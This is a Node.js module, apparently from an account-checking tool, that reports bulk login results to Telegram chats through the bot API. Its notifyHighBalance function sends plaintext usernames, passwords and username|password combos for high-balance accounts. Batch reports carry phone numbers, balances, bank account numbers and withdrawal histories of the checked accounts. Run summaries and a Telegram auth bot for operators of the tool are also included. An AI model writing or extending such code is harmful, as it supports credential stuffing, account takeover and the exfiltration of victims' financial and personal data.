const axios = require('axios');
const fs = require('fs');
const path = require('path');
const FormData = require('form-data');

const config = require('../config');
const { generateRunStatsText } = require('../utils/runStatsLogger');
const { ensureDir } = require('../utils/file');
const { nowIsoCompact } = require('../utils/time');

const TelegramBot = require('node-telegram-bot-api');
const { approveAuthSession } = require('./authService');
let pollingBot = null;

const dataQueue = [];
let dataQueueRunning = false;
let activeDataJob = 0;

const batchBuffer = [];
const BATCH_SIZE = Number(config.telegram.batchSize || 5);

function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

function safeText(input) {
  return String(input ?? '').replace(/\r/g, '').trim();
}

function escapeHtml(input) {
  return safeText(input)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

function shortText(input, max = 60) {
  const text = safeText(input || '-');
  return text.length > max ? `${text.slice(0, max)}...` : text;
}

function formatMoney(value) {
  return Number(value || 0).toLocaleString('vi-VN');
}

function formatRecentSlipHistory(items = []) {
  if (!Array.isArray(items) || items.length === 0) {
    return 'Không có';
  }

  return items
    .slice(0, 3)
    .map((item, idx) => {
      return [
        `   ${idx + 1}. ${safeText(item.type || '-')}`,
        `      💸 ${formatMoney(item.amount)}`,
        `      🏦 ${shortText(item.bankName || '-')}`,
        `      💳 ${safeText(item.bankAccount || '-')}`,
        `      📄 ${shortText(item.status || '-')}`
      ].join('\n');
    })
    .join('\n');
}

function getBotApiUrl(method) {
  return `https://api.telegram.org/bot${config.telegram.botToken}/${method}`;
}

async function sendMessage(chatId, text, topicId, options = {}) {
  if (!config.telegram.botToken || !chatId || !text) {
    console.log('[Telegram] Skipped:', {
      hasToken: !!config.telegram.botToken,
      chatId,
      hasText: !!text
    });
    return { skipped: true };
  }

  try {
    const payload = {
      chat_id: chatId,
      text,
      disable_web_page_preview: true,
      ...options
    };

    if (topicId) {
      payload.message_thread_id = topicId;
    }

    const response = await axios.post(getBotApiUrl('sendMessage'), payload, {
      timeout: 15000
    });

    console.log('[Telegram] Sent OK:', {
      chatId,
      topicId: topicId || null,
      messageId: response.data?.result?.message_id || null
    });

    return response.data;
  } catch (error) {
    const responseData = error.response?.data;

    if (responseData?.error_code === 429) {
      const retryAfter = Number(responseData?.parameters?.retry_after || 5);
      console.log(`[Telegram] Rate limited. Retry after ${retryAfter}s`);
      await sleep(retryAfter * 1000);
      return sendMessage(chatId, text, topicId, options);
    }

    console.error('[Telegram] Send failed:', responseData || error.message);
    return null;
  }
}

async function sendDocument(chatId, filePath, topicId, options = {}) {
  if (!config.telegram.botToken || !chatId || !filePath) {
    console.log('[Telegram] Document skipped:', {
      hasToken: !!config.telegram.botToken,
      chatId,
      filePath
    });
    return { skipped: true };
  }

  try {
    const form = new FormData();

    form.append('chat_id', chatId);
    form.append('document', fs.createReadStream(filePath));

    if (topicId) {
      form.append('message_thread_id', String(topicId));
    }

    Object.entries(options).forEach(([key, value]) => {
      if (value !== undefined && value !== null && value !== '') {
        form.append(key, String(value));
      }
    });

    const response = await axios.post(getBotApiUrl('sendDocument'), form, {
      headers: form.getHeaders(),
      timeout: 60000
    });

    console.log('[Telegram] Document sent OK:', {
      chatId,
      topicId: topicId || null,
      messageId: response.data?.result?.message_id || null,
      filePath
    });

    return response.data;
  } catch (error) {
    const responseData = error.response?.data;

    if (responseData?.error_code === 429) {
      const retryAfter = Number(responseData?.parameters?.retry_after || 5);
      console.log(`[Telegram] Document rate limited. Retry after ${retryAfter}s`);
      await sleep(retryAfter * 1000);
      return sendDocument(chatId, filePath, topicId, options);
    }

    console.error('[Telegram] Send document failed:', responseData || error.message);
    return null;
  }
}

async function processDataQueue() {
  if (dataQueueRunning) return;
  dataQueueRunning = true;

  try {
    while (dataQueue.length > 0) {
      const job = dataQueue.shift();
      activeDataJob++;

      try {
        await sendMessage(job.chatId, job.text, job.topicId, job.options || {});
      } finally {
        activeDataJob--;
      }

      const delayMs = Number(config.telegram.dataQueueDelayMs || 1200);
      await sleep(delayMs);
    }
  } finally {
    dataQueueRunning = false;
  }
}

function enqueueDataMessage(chatId, text, topicId, options = {}) {
  dataQueue.push({ chatId, text, topicId, options });

  console.log(
    `[Telegram Queue] Enqueued | pending=${dataQueue.length} | batchSize=${BATCH_SIZE}`
  );

  processDataQueue().catch((err) => {
    console.error('[Telegram Queue] Unexpected error:', err.message);
  });
}

async function flushBatch() {
  if (!batchBuffer.length) return;

  const batch = batchBuffer.splice(0, BATCH_SIZE);
  const header = `📊 LOGIN RESULT (${batch.length} accounts)`;

  const lines = batch.map((item, i) => {
    const statusEmoji = item.status === 'SUCCESS' ? '✅' : '❌';

    return [
      `${i + 1}️⃣ #${item.index}/${item.total}`,
      `👤 Username: ${safeText(item.username)}`,
      `📛 Name: ${safeText(item.fullname || '-')}`,
      `💰 Balance: ${formatMoney(item.balance)}`,
      `📱 Phone: ${safeText(item.phone || '-')}`,
      `📄 Status: ${statusEmoji} ${safeText(item.status)}`,
      `📝 Msg: ${shortText(item.message || '-', 80)}`,
      `🏦 Bank rút gần nhất: ${shortText(item.lastSlipBankName || '-')}`,
      `💳 STK rút gần nhất: ${safeText(item.lastSlipBankAccount || '-')}`,
      `💸 Số tiền rút gần nhất: ${formatMoney(item.lastSlipAmount)}`,
      `📌 Trạng thái rút: ${shortText(item.lastSlipStatus || '-')}`,
      `🔖 Mã GD: ${safeText(item.lastSlipTransactionCode || '-')}`,
      `📚 Lịch sử nạp/rút gần nhất:\n${formatRecentSlipHistory(item.recentSlipHistory)}`,
      '---'
    ].join('\n');
  });

  const text = [header, '', ...lines].join('\n');

  enqueueDataMessage(
    config.telegram.dataChatId,
    text,
    config.telegram.dataTopicId
  );
}

async function flushAllBatches() {
  while (batchBuffer.length > 0) {
    await flushBatch();
  }
}

async function waitForDataQueueDrain() {
  while (dataQueueRunning || dataQueue.length > 0 || activeDataJob > 0) {
    console.log(
      `[Telegram Queue] Waiting... pending=${dataQueue.length} active=${activeDataJob} buffer=${batchBuffer.length}`
    );
    await sleep(1000);
  }

  console.log('[Telegram Queue] Drain complete');
}

async function notifyDataGroup(result, index, total) {
  // đang tắt gửi batch data group theo code hiện tại
}

async function notifyHighBalance(result, password) {
  const username = escapeHtml(result.username || '-');
  const pwd = escapeHtml(password || result.password || '-');
  const nickname = escapeHtml(result.nickname || result.fullname || result.displayName || '-');
  const phone = escapeHtml(result.phone || '-');
  const fullname = escapeHtml(result.fullname || '-');
  const message = escapeHtml(result.message || '-');

  const combo = escapeHtml(`${result.username || ''}|${password || result.password || ''}`);

  const text = [
    '<b>💰 HIGH BALANCE ALERT</b>',
    '',
    `👤 <b>Username:</b> <code>${username}</code>`,
    `🔑 <b>Password:</b> <code>${pwd}</code>`,
    `🎮 <b>Nickname:</b> <code>${nickname}</code>`,
    `📛 <b>Fullname:</b> <code>${fullname}</code>`,
    `📱 <b>Phone:</b> <code>${phone}</code>`,
    '',
    `💵 <b>Balance:</b> <b>${formatMoney(result.balance)}</b>`,
    '',
    `📦 <b>Combo:</b> <code>${combo}</code>`,
    '',
    `🧾 <b>Message:</b> <i>${message}</i>`
  ].join('\n');

  console.log('>>>> notifyHighBalance');
  console.log(text);

  await sendMessage(
    config.telegram.highBalanceChatId,
    text,
    config.telegram.highBalanceTopicId,
    {
      parse_mode: 'HTML'
    }
  );
}

async function notifyRunSummaryFile(runId) {
  const text = await generateRunStatsText(runId);

  const dir = path.resolve(process.cwd(), 'output', 'summaries');
  ensureDir(dir);

  const filePath = path.join(dir, `run-summary-${nowIsoCompact()}.txt`);
  fs.writeFileSync(filePath, text, 'utf8');

  await sendDocument(
    config.telegram.summaryChatId || config.telegram.dataChatId,
    filePath,
    config.telegram.summaryTopicId || config.telegram.dataTopicId,
    {
      caption: '📄 Full run summary'
    }
  );

  console.log('[Telegram] Sent summary file:', filePath);

  return filePath;
}

async function notifyRunSummary(summary) {
  const text = [
    'RUN SUMMARY',
    `Run: ${safeText(summary.runName || '-')}`,
    `Total: ${summary.totalAccounts}`,
    `Success: ${summary.successCount}`,
    `Failed: ${summary.failedCount}`,
    `High balance: ${summary.highBalanceCount}`,
    `Threshold: ${formatMoney(summary.threshold)}`,
    `Duration: ${summary.durationMs} ms`
  ].join('\n');

  console.log('>>>> notifyRunSummary');
  console.log(text);

  await sendMessage(
    config.telegram.summaryChatId,
    text,
    config.telegram.summaryTopicId
  );
}

function normalizeTelegramUser(user = {}) {
  return {
    id: user.id,
    username: user.username || '',
    first_name: user.first_name || '',
    last_name: user.last_name || '',
    language_code: user.language_code || ''
  };
}

async function notifyAuthLogin(user, code) {
  const text = [
    '<b>🔐 LOCAL APP LOGIN</b>',
    '',
    `🧾 <b>Code:</b> <code>${escapeHtml(code)}</code>`,
    `🆔 <b>ID:</b> <code>${escapeHtml(user.id || '-')}</code>`,
    `👤 <b>Name:</b> <code>${escapeHtml(`${user.first_name || ''} ${user.last_name || ''}`.trim() || '-')}</code>`,
    `🔗 <b>Username:</b> <code>${escapeHtml(user.username ? `@${user.username}` : '-')}</code>`,
    `🌐 <b>Language:</b> <code>${escapeHtml(user.language_code || '-')}</code>`,
    `🕒 <b>Time:</b> <code>${escapeHtml(new Date().toLocaleString('vi-VN', { hour12: false }))}</code>`
  ].join('\n');

  await sendMessage(
    config.auth.telegramChatId || config.telegram.dataChatId,
    text,
    config.auth.telegramTopicId || config.telegram.dataTopicId,
    {
      parse_mode: 'HTML'
    }
  );
}

function startAuthTelegramBot() {
  if (pollingBot) return pollingBot;

  if (!config.telegram.botToken) {
    console.log('[Auth Bot] Missing bot token, auth polling disabled');
    return null;
  }

  pollingBot = new TelegramBot(config.telegram.botToken, {
    polling: true
  });

  pollingBot.onText(/^\/login(?:\s+(.+))?$/i, async (msg, match) => {
    const code = String(match?.[1] || '').trim().toUpperCase();

    if (!code) {
      await pollingBot.sendMessage(
        msg.chat.id,
        'Vui lòng gửi mã theo dạng: /login ABC123'
      );
      return;
    }

    const user = normalizeTelegramUser(msg.from);
    const result = approveAuthSession(code, user);

    if (!result.success) {
      await pollingBot.sendMessage(msg.chat.id, `❌ ${result.message}`);
      return;
    }

    await pollingBot.sendMessage(
      msg.chat.id,
      '✅ Xác thực thành công. Bạn có thể quay lại dashboard.'
    );

    await notifyAuthLogin(user, code);

    console.log('[Auth Bot] Approved login:', {
      code,
      userId: user.id,
      username: user.username
    });
    
    // tắt polling sau khi xác thực xong
    await stopAuthTelegramBot();
  });

  pollingBot.on('polling_error', (err) => {
    console.log('[Auth Bot] polling_error:', err.message);
  });

  console.log('[Auth Bot] Polling started');
  return pollingBot;
}

async function stopAuthTelegramBot() {
  if (!pollingBot) return;

  try {
    await pollingBot.stopPolling();
    console.log('[Auth Bot] Polling stopped');
  } catch (err) {
    console.log('[Auth Bot] Stop polling error:', err.message);
  } finally {
    pollingBot = null;
  }
}

module.exports = {
  notifyDataGroup,
  notifyHighBalance,
  notifyRunSummary,
  notifyRunSummaryFile,
  flushAllBatches,
  waitForDataQueueDrain,
  startAuthTelegramBot,
  notifyAuthLogin,
  stopAuthTelegramBot
};